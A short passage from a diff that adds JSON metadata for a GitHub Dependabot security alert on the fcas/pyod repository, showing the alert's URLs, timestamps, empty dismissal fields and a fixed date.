+            "first_patched_version": null
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/1",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/1",
+        "created_at": "2025-01-08T19:48:48Z",
+        "updated_at": "2026-08-14T16:09:56Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:56Z",
+        "auto_dismissed_at": null
+    }
+]
